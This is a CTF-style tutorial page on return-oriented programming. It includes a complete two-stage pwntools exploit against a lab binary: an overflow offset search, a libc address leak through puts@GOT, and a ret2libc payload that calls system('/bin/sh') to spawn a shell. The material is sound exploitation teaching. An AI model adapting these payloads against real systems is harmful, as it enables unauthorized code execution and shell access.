---
title: "ROP (Return-Oriented Programming)"
topic: "rop"
tags: [rop, binary-exploitation, pwntools, return-oriented-programming, libc, got, plt]
difficulty: advanced
day: 71
layout: default
parent: Topics
nav_order: 71
---

# ROP (Return-Oriented Programming)

## What You Will Learn
- What ROP is and why it is needed when the stack is non-executable
- How to find and chain ROP gadgets
- How to leak a libc address and calculate the base address
- How to build a two-stage exploit to pop a shell

## What Is It?

**Return-Oriented Programming (ROP)** is an exploitation technique used when the stack is non-executable (NX/DEP is enabled). Instead of injecting shellcode, the attacker chains together small existing code snippets called **gadgets** — each ending with a `ret` instruction — to perform arbitrary operations.

Because the gadgets are from the program or its libraries (not the stack), they execute in legitimate memory regions.

## Why It Matters

NX is enabled on almost every modern binary. ROP is the standard technique to bypass it. Understanding ROP is required for:
- CTF pwn challenges
- Real-world exploit development
- Malware research

## ROP Challenge Walkthrough

### Setup

Given a binary and its linked libc. Check security mitigations:

```bash
checksec rop_server
```

The binary has:
- No stack canary — stack overflows work
- Non-executable stack (NX enabled) — cannot run injected shellcode directly
- No PIE — binary base address is fixed

### Finding the Buffer Overflow

```python
from pwn import *

# Generate a cyclic pattern to find the offset
pattern = cyclic(200)
p = process('./rop_server')
p.sendline(pattern)
p.wait()

# Check RSP at crash to find offset
core = p.corefile
offset = cyclic_find(core.rsp)  # returns 72
```

Buffer overflow offset to return address: **72 bytes**.

### GDB Script to Bypass Socket Setup

The binary sets up a TCP socket — use a GDB script to skip it:

```gdb
b *main+221
r < ola
set $rip=*main+356
c
```

### Stage 1 — Leak libc Address

The plan: use `puts@plt` to print `puts@got` (its own address in memory). This leaks the runtime address of `puts` in libc. Then subtract the static offset to get libc base.

```python
from pwn import *

offset = b"A" * 72

rop = ELF("./rop_server")

pop_rdi   = p64(0x4011f7)       # pop rdi; ret gadget
puts_got  = p64(rop.got['puts'])    # puts@GOT — holds runtime address
puts_plt  = p64(rop.plt['puts'])    # puts@PLT — calls puts
main_func = p64(0x401395)       # restart binary for stage 2

# First payload: leak puts address, then return to main
payload = offset + pop_rdi + puts_got + puts_plt + main_func
```

### Stage 2 — Call system("/bin/sh")

Now that we have libc base, find `system()` and `"/bin/sh"` within libc:

```bash
strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
```

```python
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

proc = remote('0.0.0.0', 3001)
proc.writeafter("What is my address?\n", payload + b"\n")

proc.recv(2)  # receive newline

# Receive leaked puts address (6 bytes, little-endian)
libc_puts = u64(proc.recv(6).ljust(8, b'\x00'))

# Calculate libc base
libc.address = libc_puts - libc.symbols['puts']

# Build second payload: system("/bin/sh")
binsh_addr = p64(libc.address + 0x197e34)   # offset of "/bin/sh"
system     = p64(libc.symbols['system'])

payload2 = offset + pop_rdi + binsh_addr + system
payload2 += p64(libc.symbols['exit'])       # clean exit

proc.writeafter("What is my address?\n", payload2 + b"\n")
proc.interactive()  # SHELL!
```

## Key Concepts

| Term | Description |
|------|-------------|
| **Gadget** | A sequence of instructions ending with `ret` |
| **PLT (Procedure Linkage Table)** | Used to call shared library functions |
| **GOT (Global Offset Table)** | Stores runtime addresses of shared library functions |
| **ret2libc** | Return to a libc function (like `system()`) |
| **ASLR** | Randomizes library base addresses at runtime |

### Finding Gadgets

```bash
# ROPgadget
ROPgadget --binary ./binary --rop

# ropper
ropper -f ./binary

# pwntools
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
```

## Resources

- [pwn.college — ROP](https://pwn.college/)
- [LiveOverflow — How ROP Works](https://www.youtube.com/c/LiveOverflow)
- [pwntools ROP documentation](https://docs.pwntools.com/en/stable/rop/rop.html)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)
- [CTF101 — Return Oriented Programming](https://ctf101.org/binary-exploitation/return-oriented-programming/)
